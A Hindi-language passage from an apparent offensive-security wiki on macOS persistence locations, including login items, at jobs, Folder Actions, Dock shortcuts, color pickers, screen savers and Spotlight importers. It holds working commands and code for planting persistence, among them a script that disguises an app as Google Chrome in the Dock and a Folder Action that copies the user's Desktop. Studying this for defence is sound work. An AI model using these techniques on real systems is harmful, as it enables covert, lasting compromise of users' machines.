पुराने login items को Apple events के ज़रिए भी manage किया जा सकता है। उन्हें command line से सूचीबद्ध करना, जोड़ना और हटाना संभव है, हालाँकि उन्हें जोड़ने से उपयोगकर्ता का persistent login configuration बदलता है और इसके लिए Automation approval की आवश्यकता हो सकती है:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` एक implementation detail है, फ़ाइल लिखकर payload इंस्टॉल करने के लिए समर्थित जगह नहीं। पुराना `SMLoginItemSetEnabled` API नए helpers के लिए `SMAppService` से superseded है; पेज में दिया गया पुराना `/var/db/com.apple.xpc.launchd/loginitems.501.plist` path macOS 26.5.2 test machine पर मौजूद नहीं था। आधुनिक login items का आकलन करते समय किसी अनुमानित database path के बजाय registration API और system UI state का उपयोग करें।

### ZIP as Login Item

(Login Items के बारे में पिछला section देखें, यह उसका extension है)

अगर आप **ZIP** फ़ाइल को **Login Item** के रूप में रखते हैं, तो **`Archive Utility`** उसे खोलेगा। उदाहरण के लिए, अगर zip को **`~/Library`** में रखा गया हो और उसमें backdoor वाली **`LaunchAgents/file.plist`** फ़ाइल हो, तो वह folder बन जाएगा (यह default रूप से मौजूद नहीं होता) और plist उसमें जोड़ दी जाएगी। इस तरह, अगली बार user के फिर से login करने पर **plist में बताया गया backdoor execute होगा**।

एक दूसरा विकल्प user HOME के अंदर **`.bash_profile`** और **`.zshenv`** फ़ाइलें बनाना है, ताकि LaunchAgents folder पहले से मौजूद हो, तब भी यह technique काम करे।

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन आपको **`at` को execute** करना होगा और यह **enabled** होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at` को execute** करना होगा और यह **enabled** होना चाहिए

#### **Description**

`at` tasks को तय समय पर execute होने वाले **one-time tasks schedule** करने के लिए बनाया गया है। cron jobs से अलग, `at` tasks execute होने के बाद अपने-आप हटा दिए जाते हैं। यह ध्यान रखना ज़रूरी है कि ये tasks system reboots के बाद भी बने रहते हैं, जिससे कुछ स्थितियों में वे संभावित security concerns बन सकते हैं।<sup>[[16]](#references)</sup>

Bundled `com.apple.atrun.plist` में `Disabled = true` है, लेकिन launchd प्रभावी enabled/disabled overrides को अलग से रखता है। macOS 26.5.2 test machine पर, `launchctl print-disabled system` ने `com.apple.atrun` को **enabled** बताया, जबकि bundled key में कुछ और था। यह दावा करने से पहले कि `at` jobs चलेंगी, प्रभावी state जाँचें:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

एक प्रशासक `launchctl` से disabled `atrun` service को enable कर सकता है; नीचे दिया गया ऐतिहासिक उदाहरण system service की स्थिति बदलता है और इसे research Mac पर **नहीं** चलाया गया था:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

यह 1 घंटे में एक फ़ाइल बनाएगा:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

`atq:` का उपयोग करके job queue देखें:

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

ऊपर हम दो निर्धारित jobs देख सकते हैं। हम `at -c JOBNUMBER` का उपयोग करके job का विवरण प्रिंट कर सकते हैं।

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> यदि AT tasks सक्षम नहीं हैं, तो बनाए गए tasks निष्पादित नहीं होंगे।

**job files** `/private/var/at/jobs/` में मिल सकती हैं।

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

फ़ाइलनाम में queue, job number और इसे चलाने के लिए निर्धारित समय होता है। उदाहरण के लिए, `a0001a019bdcd2` को देखें।

- `a` - यह queue है
- `0001a` - hex में job number, `0x1a = 26`
- `019bdcd2` - hex में समय। यह epoch से बीते मिनटों को दर्शाता है। `0x019bdcd2` दशमलव में `26991826` है। इसे 60 से गुणा करने पर `1619509560` मिलता है, जो है `GMT: 2021. अप्रैल 27., मंगलवार 7:46:00`।

अगर हम job file प्रिंट करें, तो हमें उसमें वही जानकारी मिलती है जो `at -c` से मिली थी।

### Calendar के open-file alerts

- **Write target:** कोई executable app bundle या दूसरी फ़ाइल, जिसे Calendar event के custom **Open file** alert में **पहले से चुना गया हो**। Alert बनाने या संपादित करने के लिए Calendar या किसी स्वीकृत calendar data source के ज़रिए उस calendar event तक पहुंच चाहिए; किसी random file को लिखने से alert नहीं बनता।
- **Trigger:** उस Mac पर alert का निर्धारित समय, जहां Calendar event को प्रोसेस करता है। Recurring event इस कार्रवाई को दोहरा सकता है। [Apple की मौजूदा Calendar guide](https://support.apple.com/guide/calendar/icl1012/mac) macOS 26 पर **Custom → Open file** alert विकल्प की पुष्टि करती है।
- **Execution identity और gates:** Calendar चुनी हुई फ़ाइल को signed-in user के लिए, उससे जुड़ी application के ज़रिए खोलता है। App bundle लॉन्च करने से उसका code उस user के रूप में चल सकता है, जो Gatekeeper, quarantine और macOS की अन्य जांचों के अधीन है। कोई सामान्य script file शायद सिर्फ़ editor में खुले; केवल उसका extension यह साबित नहीं करता कि code execute होगा।

किसी candidate का सुरक्षित आकलन करने के लिए Calendar में event का alert और चुनी हुई फ़ाइल की permissions जांचें। इस तरीके का दस्तावेज़ीकरण Apple की guide से किया गया था और इसे research Mac पर **नहीं** चलाया गया, क्योंकि परीक्षण से live calendar में बदलाव होता और desktop event का इंतज़ार करना पड़ता। Disposable account में marker-only app bundle चुनकर, निकट भविष्य का Open file alert सेट करके, launch की पुष्टि की जा सकती है और बाद में event और app हटाए जा सकते हैं।

### macOS पर Shortcuts automations

- **Write target:** कोई executable file, जिसे shortcut की action में **पहले से संदर्भित किया गया हो**, या कोई मौजूदा shortcut जिसे अधिकृत user संपादित कर सके। कोई random `.shortcut` file या undocumented Shortcuts database में write करना automation registration का समर्थित तरीका नहीं है।
- **Trigger और identity:** पहले से configured, enabled automation event—जैसे दिन का समय या app event—signed-in user के लिए shortcut invoke करता है। [Apple की मौजूदा Mac automation guide](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) समर्थित events की सूची देती है, बताती है कि automation कब पूछे बिना चल सकती है, और trigger हटाने का तरीका बताती है। [Apple की Shortcuts privacy guide](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) script actions के लिए **Allow Running Scripts** आवश्यक बताती है, और अलग-अलग actions फिर भी permissions मांग सकती हैं।

यह write-to-execution path **केवल तभी लागू होता है, जब मौजूदा action किसी writable target को load करे**। UI के ज़रिए नई automation बनाने से live settings बदलती हैं; research Mac पर ऐसा करने का प्रयास नहीं किया गया। Disposable account में owner ऐसा time-of-day shortcut configure कर सकता है जिसकी script `/tmp/ht-shortcuts-marker` को touch करे, ज़रूरी permissions enable कर सकता है, event के बाद marker की पुष्टि कर सकता है, और फिर automation, shortcut और marker हटा सकता है।

### Automator actions और Quick Actions

- **Write targets:** action bundles के लिए `~/Library/Automator/*.action` (user) और `/Library/Automator/*.action` (administrator)। Saved Quick Action workflow आमतौर पर `~/Library/Services/*.workflow` में रखा जाता है; user द्वारा चुना गया वास्तविक workflow path जांचें। [Apple का Automator framework reference](https://developer.apple.com/documentation/automator) action search directories की सूची देता है।
- **Trigger:** Automator चलने पर उपलब्ध action bundles load करता है, लेकिन action का task तभी चलता है जब उसे इस्तेमाल करने वाला workflow execute हो। Quick Action तब चलता है जब user उसे Finder, Services या किसी अन्य उपलब्ध menu से चुनता है। Folder Action workflow तब चलता है जब उसके **पहले से जुड़े** folder में items जोड़े जाते हैं, और Calendar Alarm workflow अपने event के समय चलता है। [Apple के workflow types](https://support.apple.com/guide/automator/aut7cac58839/mac) इन events के बीच अंतर बताते हैं। केवल action या workflow लिखने से folder attach नहीं होता और calendar event schedule नहीं होता।
- **Execution identity और gates:** workflow चलाने वाला account; Automator या उसे invoke करने वाली app को action load करना होगा और मौजूदा code-signing या privacy checks को इसकी अनुमति देनी होगी। किसी active workflow में पहले से संदर्भित writable action bundle का मामला, नया action install करने और उसके चुने जाने का इंतज़ार करने से अलग है।

macOS 26.5.2 test Mac पर user की `Automator` और `Services` directories मौजूद थीं; `/Library/Automator` मौजूद नहीं था। कोई live workflow बनाया, attach या execute नहीं किया गया। किसी खास load path की पुष्टि करने के लिए disposable account और marker-only action/workflow का उपयोग करें। अलग [Folder Actions](#folder-actions) section में उस event source का अधिक विस्तार से वर्णन है।

### Folder Actions

लेख: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
लेख: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- sandbox को bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन Folder Actions configure करने के लिए **`System Events`** से संपर्क करने हेतु arguments के साथ `osascript` call कर पाना ज़रूरी है
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - इसमें Desktop, Documents और Downloads जैसी कुछ बुनियादी TCC permissions हैं

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
  - Root आवश्यक
  - **Trigger**: निर्दिष्ट folder तक पहुंच
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Trigger**: निर्दिष्ट folder तक पहुंच

#### Description & Exploitation

Folder Actions वे scripts हैं जो किसी folder में बदलाव होने पर अपने-आप trigger होती हैं, जैसे items जोड़ना या हटाना, या folder window खोलना या उसका आकार बदलना। इन actions का उपयोग कई तरह के कार्यों के लिए किया जा सकता है और इन्हें Finder UI या terminal commands जैसे अलग-अलग तरीकों से trigger किया जा सकता है।<sup>[[17]](#references)[[18]](#references)</sup>

Folder Actions सेट अप करने के लिए आपके पास ये विकल्प हैं:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) से Folder Action workflow बनाना और उसे service के रूप में install करना।
2. किसी folder के context menu में Folder Actions Setup के ज़रिए script को manually attach करना।
3. प्रोग्राम के ज़रिए Folder Action सेट अप करने के लिए `System Events.app` को Apple Event messages भेजने हेतु OSAScript का उपयोग करना।
   - यह तरीका action को system में embed करने के लिए खास तौर पर उपयोगी है और persistence का एक स्तर प्रदान करता है।

यह script इस बात का उदाहरण है कि Folder Action क्या execute कर सकती है:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

ऊपर दी गई स्क्रिप्ट को Folder Actions के साथ उपयोग करने योग्य बनाने के लिए, इसे compile करें:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

स्क्रिप्ट compile होने के बाद, नीचे दी गई स्क्रिप्ट चलाकर Folder Actions सेट अप करें। यह स्क्रिप्ट Folder Actions को globally enable करेगी और पहले से compile की गई स्क्रिप्ट को विशेष रूप से Desktop folder से attach करेगी।

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

इससे setup script चलाएँ:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- GUI के माध्यम से इस persistence को लागू करने का तरीका यह है:

यह वह script है जिसे execute किया जाएगा:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

इसे `osacompile -l JavaScript -o folder.scpt source.js` से compile करें

इसे यहां ले जाएं:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

फिर, `Folder Actions Setup` ऐप खोलें, **जिस फ़ोल्डर पर आप नज़र रखना चाहते हैं उसे चुनें** और अपने मामले में **`folder.scpt`** चुनें (मेरे मामले में मैंने इसे output2.scp नाम दिया था):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

अब, अगर आप उस फ़ोल्डर को **Finder** से खोलते हैं, तो आपकी script execute होगी।

यह configuration base64 format में **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** में मौजूद **plist** में store की गई थी।

अब, GUI access के बिना इस persistence को तैयार करने की कोशिश करते हैं:

1. Backup के लिए **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** को `/tmp` में **copy** करें:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. अभी-अभी सेट किए गए Folder Actions को **हटाएँ**:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

अब हमारे पास एक खाली environment है।

3. Backup file को copy करें: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. इस config को consume करने के लिए Folder Actions Setup.app खोलें: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> यह मेरे लिए काम नहीं किया, लेकिन writeup में यही instructions दिए गए हैं:(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन आपको system के अंदर एक malicious application install करना होगा
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
  - **Trigger**: जब user Dock के अंदर मौजूद app पर click करता है

#### Description & Exploitation

Dock में दिखाई देने वाली सभी applications plist के अंदर specified होती हैं: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

सिर्फ़ यह करके **एक application जोड़ना** संभव है:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

कुछ **social engineering** का उपयोग करके, आप dock के अंदर उदाहरण के लिए **Google Chrome** का रूप धारण कर सकते हैं और वास्तव में अपनी स्क्रिप्ट चला सकते हैं:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### इनपुट मेथड्स

- **लिखने का लक्ष्य:** `~/Library/Input Methods/` (यूज़र) या `/Library/Input Methods/` (एडमिनिस्ट्रेटर) में इंस्टॉल किया गया code-bearing input-method app bundle। यह Apple की plain-text `.inputplugin` keyboard-mapping files से अलग है, जो अपने आप में arbitrary-code payload नहीं होतीं।
- **ट्रिगर:** यूज़र **System Settings → Keyboard → Text Input** में input source जोड़ता/सक्षम करता है और फिर उसे चुनता या इस्तेमाल करता है। केवल किसी bundle को डायरेक्टरी में कॉपी कर देना इस बात का प्रमाण नहीं है कि macOS उसे लॉन्च करेगा। [Apple की मौजूदा Input Sources गाइड](https://support.apple.com/guide/mac-help/mchl84525d76/mac) sources को सक्षम करने और उनके बीच स्विच करने का तरीका बताती है; [Apple का InputMethodKit दस्तावेज़](https://developer.apple.com/documentation/inputmethodkit) code-bearing input methods को कवर करता है।
- **Execution identity और gates:** यह method signed-in यूज़र के लिए चलता है और input-method registration, code-signing तथा macOS के मौजूदा security checks के अधीन है। पहले से enabled methods जिनका executable writable हो, उनके लिए अलग path और signature review ज़रूरी है।

Apple के [तीसरे पक्ष के input methods पर पुराने नोट](https://developer.apple.com/library/archive/qa/qa1810/_index.html) में पहले ही चेतावनी दी गई थी कि कुछ palette methods को इन डायरेक्टरी में कॉपी करने से वे Input Sources में दिखाई भी नहीं देते। macOS 26.5.2 वाले research Mac पर यूज़र डायरेक्टरी मौजूद है, लेकिन कोई bundle इंस्टॉल या activate नहीं था; इसलिए यह स्थानीय runtime result नहीं, बल्कि दस्तावेज़ में दर्ज एक conditional path है।

### Color Pickers

लेख: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Sandbox को bypass करने में उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - एक खास कार्रवाई होना ज़रूरी है
  - आप किसी दूसरे sandbox में पहुँच जाएंगे
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- `/Library/ColorPickers`
  - Root आवश्यक है
  - ट्रिगर: color picker का इस्तेमाल करें
- `~/Library/ColorPickers`
  - ट्रिगर: color picker का इस्तेमाल करें

#### विवरण और Exploit

अपने code के साथ **color picker** bundle **compile करें** (उदाहरण के लिए [**यह वाला**](https://github.com/viktorstrate/color-picker-plus) इस्तेमाल कर सकते हैं), उसमें एक constructor जोड़ें (जैसा [Screen Saver सेक्शन](macos-auto-start-locations.md#screen-saver) में है) और bundle को `~/Library/ColorPickers` में कॉपी करें।<sup>[[20]](#references)</sup>

इसके बाद, color picker ट्रिगर होने पर आपका bundle भी execute होना चाहिए।

यह तभी संभव है जब कोई compatible app system color panel खोले और इंस्टॉल किया गया picker चुने। [Apple की color-panel गाइड](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) legacy bundle locations का वर्णन करती है। स्थानीय path check में legacy color-picker XPC service मिली, लेकिन research Mac पर कोई picker इंस्टॉल या load नहीं था; केवल path के आधार पर TCC bypass का निष्कर्ष न निकालें।

ध्यान दें कि आपकी library load करने वाले binary पर **बहुत सख्त sandbox** लागू है: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Sandbox bypass के लिए उपयोगी: **नहीं, क्योंकि आपको अपना ऐप execute करना होगा**
- TCC bypass: यह enabled extension के sandbox और permissions पर निर्भर करता है; कोई सामान्य bypass स्थापित नहीं हुआ है।

#### स्थान

- एक विशिष्ट ऐप

#### विवरण और Exploit

Finder Sync Extension वाले ऐप का एक उदाहरण [**यहाँ देखा जा सकता है**](https://github.com/D00MFist/InSync)।

ऐप्स में `Finder Sync Extensions` हो सकते हैं। यह extension उस ऐप के अंदर मौजूद होता है जिसे execute किया जाएगा। इसके अलावा, extension को अपना code execute करने के लिए किसी मान्य Apple developer certificate से **signed** होना **ज़रूरी है**, उसे **sandboxed** होना चाहिए (हालाँकि इसमें कम प्रतिबंध वाले अपवाद जोड़े जा सकते हैं) और इसे इस तरह की किसी चीज़ से register किया जाना चाहिए:<sup>[[21]](#references)[[22]](#references)</sup>

Install किए गए extension को **enabled** होना और किसी प्रासंगिक Finder location या item के लिए invoke किया जाना भी आवश्यक है; मनमाना `.appex` bundle लिखना पर्याप्त नहीं है। [Apple's Finder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) enabled state दिखाती है। नीचे दिए गए `pluginkit` commands स्पष्ट रूप से registration और enabling के उदाहरण हैं, केवल फ़ाइल के आधार पर auto-start का नहीं। इस तरीके की documentation की समीक्षा की गई थी; शोध Mac पर कोई नया extension install या enable नहीं किया गया था।

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Sandbox bypass के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन अंत में आप एक सामान्य application sandbox में होंगे
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### लोकेशन

- `/System/Library/Screen Savers`
  - Root की आवश्यकता है
  - **ट्रिगर**: Screen Saver चुनें
- `/Library/Screen Savers`
  - Root की आवश्यकता है
  - **ट्रिगर**: Screen Saver चुनें
- `~/Library/Screen Savers`
  - **ट्रिगर**: Screen Saver चुनें

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### विवरण और Exploit

Xcode में एक नया project बनाएँ और नया **Screen Saver** generate करने के लिए template चुनें। फिर उसमें अपना code जोड़ें, उदाहरण के लिए logs generate करने के लिए निम्न code।<sup>[[23]](#references)[[24]](#references)</sup>

इसे **Build** करें और `.saver` bundle को **`~/Library/Screen Savers`** में copy करें। फिर Screen Saver GUI खोलें और उस पर click करें; इससे बहुत सारे logs generate होने चाहिए:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> ध्यान दें कि इस कोड को लोड करने वाले binary (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) के entitlements में **`com.apple.security.app-sandbox`** मौजूद है, इसलिए आप **सामान्य application sandbox के अंदर** होंगे।

स्क्रीनसेवर कोड:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आप application sandbox में ही होंगे
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - sandbox बहुत सीमित लगता है

#### स्थान

- `~/Library/Spotlight/`
  - **Trigger**: Spotlight plugin द्वारा managed extension वाली नई file बनाई जाती है।
- `/Library/Spotlight/`
  - **Trigger**: Spotlight plugin द्वारा managed extension वाली नई file बनाई जाती है।
  - root आवश्यक है
- `/System/Library/Spotlight/`
  - **Trigger**: Spotlight plugin द्वारा managed extension वाली नई file बनाई जाती है।
  - root आवश्यक है
- `Some.app/Contents/Library/Spotlight/`
  - **Trigger**: Spotlight plugin द्वारा managed extension वाली नई file बनाई जाती है।
  - नया app आवश्यक है

#### विवरण और Exploitation

Spotlight macOS का built-in search feature है, जिसे उपयोगकर्ताओं को **अपने कंप्यूटर के डेटा तक तेज़ और व्यापक पहुँच** देने के लिए बनाया गया है।\
इस तेज़ search सुविधा के लिए, Spotlight एक **proprietary database** रखता है और **अधिकांश files को parse** करके एक index बनाता है, जिससे file names और उनकी content दोनों में तेज़ी से search की जा सकती है।<sup>[[25]](#references)</sup>

Spotlight के पीछे का mechanism 'mds' नाम की एक central process है, जिसका अर्थ **'metadata server'** है। यह process पूरी Spotlight service को संचालित करती है। इसके साथ कई 'mdworker' daemons भी होते हैं, जो अलग-अलग file types को index करने जैसे कई maintenance tasks करते हैं (`ps -ef | grep mdworker`)। ये tasks Spotlight importer plugins, या **".mdimporter bundles**" के ज़रिए संभव होते हैं, जो Spotlight को विभिन्न file formats की content समझने और index करने में सक्षम बनाते हैं।

Plugins या **`.mdimporter`** bundles पहले बताए गए स्थानों पर मौजूद होते हैं। नए bundle को खोजा जाना चाहिए और उसे किसी file type से मेल खाना चाहिए; साथ ही Spotlight को वास्तव में उससे मेल खाने वाली file को index करना चाहिए। केवल bundle copy करने से यह साबित नहीं होता कि वह load हो चुका है। [Apple का MDImporter reference](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) loading को किसी योग्य बदली हुई file से जोड़ता है। यहाँ macOS 26 पर Spotlight importer का execution test नहीं किया गया।

चल रहे सभी `mdimporters` को इस तरह **ढूँढा** जा सकता है:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

